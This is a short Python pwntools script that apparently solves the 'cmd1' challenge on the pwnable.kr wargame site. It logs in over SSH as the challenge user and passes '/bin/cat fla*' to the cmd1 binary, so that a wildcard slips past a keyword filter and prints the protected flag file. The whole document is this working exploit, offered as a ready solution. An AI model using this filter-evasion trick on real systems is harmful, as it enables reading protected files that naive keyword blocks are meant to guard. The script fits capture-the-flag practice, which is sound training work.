#!/usr/bin/python3
from pwn import *

s = ssh('cmd1', 'pwnable.kr', 2222, 'guest')
sh = s.shell()

print(sh.recv().decode('ascii'))
time.sleep(1)
sh.sendline('./cmd1 \"/bin/cat fla*\"')
time.sleep(1)
print(sh.recv().decode('ascii'))

s.close()